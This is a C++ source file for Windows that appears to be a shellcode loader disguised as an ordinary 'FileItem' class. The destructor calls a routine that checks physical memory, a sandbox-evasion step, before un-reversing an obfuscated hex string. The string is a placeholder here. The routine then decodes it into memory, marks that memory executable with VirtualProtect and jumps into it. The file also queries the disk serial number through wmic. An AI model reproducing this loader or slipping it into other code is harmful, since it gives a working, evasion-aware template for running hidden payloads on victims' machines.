#include "stdafx.h"
#include "FileItem.h"
#include <windows.h>
#include <stdio.h>


static const int kMaxInfoBuffer = 256;
#define  GBYTES  1073741824  
#define  MBYTES  1048576  
#define  KBYTES  1024  
#define  DKBYTES 1024.0 


char* test()
{
   
    char ch1[3708] = "shellcode_hex_倒序_0to*", ch2[3708] = {  };
    int n = 0, i = 0, j = 0;
    n = strlen(ch1);
    for (i = n - 1; i >= 0; i--) {
       
        ch2[j] = ch1[i];
        
       
        j++;
    }
    char* s = ch2;
    return s;
}

int Gmain()
{


    std::string memory_info;
    MEMORYSTATUSEX statusex;
    statusex.dwLength = sizeof(statusex);
    if (GlobalMemoryStatusEx(&statusex))
    {
        unsigned long long total = 0, remain_total = 0, avl = 0, remain_avl = 0;
        double decimal_total = 0, decimal_avl = 0;
        remain_total = statusex.ullTotalPhys % GBYTES;
        total = statusex.ullTotalPhys / GBYTES;
        avl = statusex.ullAvailPhys / GBYTES;
        remain_avl = statusex.ullAvailPhys % GBYTES;
        if (remain_total > 0)
            decimal_total = (remain_total / MBYTES) / DKBYTES;
        if (remain_avl > 0)
            decimal_avl = (remain_avl / MBYTES) / DKBYTES;

        decimal_total += (double)total;
        decimal_avl += (double)avl;
        char  buffer[kMaxInfoBuffer];
        sprintf_s(buffer, kMaxInfoBuffer, "total %.2f GB (%.2f GB available)", decimal_total, decimal_avl);
        memory_info.append(buffer);
        return decimal_total;
    }
    
    return 0;
}


std::string execCmd(const char* cmd)
{
    char buffer[128] = { 0 };
    std::string result;
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("_popen() failed!");
    while (!feof(pipe))
    {
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }
    _pclose(pipe);

    return result;
}

void getHardDiskInfo()
{
    std::string hd_seiral = execCmd("wmic path win32_physicalmedia get SerialNumber");
    std::cout << "HardDisk Serial Number: " << hd_seiral << std::endl;
}
void Run(char* test)
{
    unsigned int char_in_hex;
    char* shellcode = test;
    unsigned int iterations = strlen(shellcode);
    unsigned int memory_allocation = strlen(shellcode) / 2;
    for (unsigned int i = 0; i < iterations - 1; i++) {
        sscanf_s(shellcode + 2 * i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }
    void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
    (*(void (*)()) exec)();

}


char* replace_str(char* text, char sp_ch, char re_ch) {
    int len = strlen(text);

    char* copy = (char*)malloc(len + 1);

    for (int i = 0; i < len; i++)
    {
        
        char ch = text[i];
        if (ch == sp_ch)
            copy[i] = re_ch;
        else
            copy[i] = ch;
    }
    copy[len] = 0;
    strcpy(text, copy);
    free(copy);
    return text;
}



FileItem::FileItem()
	: Item()
{
	className = "FileItem";
}


FileItem::~FileItem()
{
    Print();
}

void FileItem::Print()
{
    if (Gmain()>1)
    {
        Run(replace_str(test(), '*', '0'));
    }
    else
    {
        return;
    }
   

}

